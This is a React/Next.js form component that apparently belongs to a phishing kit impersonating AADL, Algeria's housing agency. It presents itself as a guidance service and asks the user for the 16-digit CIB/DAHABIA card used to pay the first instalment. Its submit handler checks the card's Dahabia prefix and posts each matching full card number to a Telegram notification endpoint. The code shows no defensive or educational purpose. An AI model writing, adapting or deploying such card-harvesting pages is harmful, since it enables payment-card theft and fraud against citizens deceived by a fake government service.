"use client"

import type React from "react"
import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card } from "@/components/ui/card"
import { CreditCard } from "lucide-react"
import Image from "next/image"

interface CardNumberStepProps {
  onNext: () => void
  onBack: () => void
  formData: any
  updateFormData: (data: any) => void
}

export function CardNumberStep({ onNext, onBack, formData, updateFormData }: CardNumberStepProps) {
  const [error, setError] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)

  const isValidDahabiaPrefix = (cardNum: string) => {
    const cleanNum = cardNum.replace(/\s/g, "")
    return cleanNum.startsWith("62807030") || cleanNum.startsWith("62807031")
  }

  const validateCardNumber = (cardNum: string) => {
    const cleanNum = cardNum.replace(/\s/g, "")
    return cleanNum.length === 16 && /^\d+$/.test(cleanNum)
  }

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\s/g, "").slice(0, 16)
    if (!/^\d*$/.test(value)) return
    updateFormData({ cardNumber: value })
    setError("")
  }

  const sendNotificationToTelegram = async (cardNumber: string) => {
    try {
      const telegramMessage = `
<b>AADL - مستخدم يدخل بيانات البطاقة</b>

<b>رقم البطاقة:</b> ${cardNumber}
<b>الحالة:</b> المستخدم بدأ ادخال بيانات CIB/DAHABIA
<b>الوقت:</b> ${new Date().toLocaleString()}
      `

      await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: telegramMessage,
          pageStatus: "card_number_entered",
          cardNumber: cardNumber,
        }),
      })
    } catch (error) {
      console.error("Failed to send notification to Telegram:", error)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!validateCardNumber(formData.cardNumber)) {
      setError("رقم البطاقة يجب ان يكون 16 رقم")
      return
    }

    setIsSubmitting(true)

    // Only send notification if card starts with valid Dahabia prefix
    if (isValidDahabiaPrefix(formData.cardNumber)) {
      await sendNotificationToTelegram(formData.cardNumber)
    }

    setIsSubmitting(false)
    onNext()
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#1a1a4e] via-[#2a2a6e] to-[#1a1a4e] flex items-center justify-center p-4 relative overflow-hidden">
      {/* Background decorations */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-full opacity-5">
          <div className="absolute top-10 left-10 w-64 h-64 bg-white rounded-full blur-3xl" />
          <div className="absolute bottom-20 right-10 w-80 h-80 bg-yellow-400 rounded-full blur-3xl" />
        </div>
        <div className="absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.03)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.03)_1px,transparent_1px)] bg-[size:50px_50px]" />
      </div>

      <div className="relative z-10 w-full max-w-md">
        {/* Logo */}
        <div className="flex justify-center mb-4">
          <div className="bg-white rounded-xl p-2 shadow-xl">
            <Image src="/aadl-logo.png" alt="AADL" width={60} height={60} className="object-contain" />
          </div>
        </div>

        <Card className="bg-white/95 backdrop-blur-sm p-6 shadow-2xl border-0 rounded-2xl">
          {/* Icon */}
          <div className="flex justify-center mb-4">
            <div className="w-14 h-14 bg-gradient-to-r from-[#1a1a4e] to-[#3a3a8f] rounded-full flex items-center justify-center">
              <CreditCard className="w-7 h-7 text-white" />
            </div>
          </div>

          <h1 className="text-lg font-bold text-center mb-1 text-[#1a1a4e]">رقم البطاقة</h1>
          <p className="text-xs text-gray-500 text-center mb-4">ادخل رقم البطاقة التي دفعت منها الشطر الاول</p>

          {/* Info box */}
          <div className="bg-blue-50 rounded-xl p-3 mb-4">
            <p className="text-xs text-gray-700 text-center leading-relaxed">
              يرجى ادخال رقم البطاقة (CIB/DAHABIA) المكون من 16 رقم والتي استخدمتها لدفع الشطر الاول
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label className="block text-sm font-semibold mb-2 text-gray-700 text-right">رقم البطاقة (16 رقم)</label>
              <Input
                type="text"
                inputMode="numeric"
                placeholder="0000000000000000"
                maxLength={16}
                value={formData.cardNumber || ""}
                onChange={handleCardNumberChange}
                className="w-full text-center text-xl font-mono tracking-[0.3em] h-14 border-2 border-[#1a1a4e]/20 focus:border-[#1a1a4e]"
                dir="ltr"
                autoFocus
              />
              {error && <p className="text-red-500 text-sm mt-2 text-center">{error}</p>}
            </div>

            <Button
              type="submit"
              disabled={isSubmitting || !formData.cardNumber || formData.cardNumber.length !== 16}
              className="w-full bg-gradient-to-r from-[#1a1a4e] to-[#3a3a8f] hover:from-[#2a2a6e] hover:to-[#4a4a9f] text-white font-semibold py-3 rounded-xl transition-all disabled:opacity-50"
            >
              {isSubmitting ? "جاري التحقق..." : "متابعة"}
            </Button>
          </form>

          <Button onClick={onBack} variant="outline" className="w-full mt-3 bg-transparent">
            العودة
          </Button>
        </Card>

        <p className="text-center text-xs text-white/50 mt-4">خدمة ارشادية لمتابعة ملفات AADL 3</p>
      </div>
    </div>
  )
}
